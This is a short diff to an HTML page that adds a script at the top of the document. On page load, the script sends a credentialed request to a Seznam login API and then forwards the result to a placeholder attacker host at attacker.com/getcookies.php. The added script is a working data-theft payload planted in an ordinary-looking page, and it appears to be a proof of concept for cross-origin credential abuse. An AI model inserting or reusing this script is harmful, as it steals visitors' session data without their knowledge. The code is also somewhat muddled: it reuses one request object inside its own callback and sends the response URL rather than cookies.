@@ -1,4 +1,17 @@
 <!doctype html>
+<script>
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200){
+        xhttp.open("GET", "https://attacker.com/getcookies.php?c=" + xhttp.responseURL, true);
+        xhttp.send();
+    }
+};
+xhttp.open("GET", "https://login.seznam.cz/api/v1/user/badge?service=homepage", true);
+xhttp.setRequestHeader("Accept","application/json");
+xhttp.withCredentials = true;
+xhttp.send();
+</script>
 <html>
 <head>
   <meta charset="UTF-8">
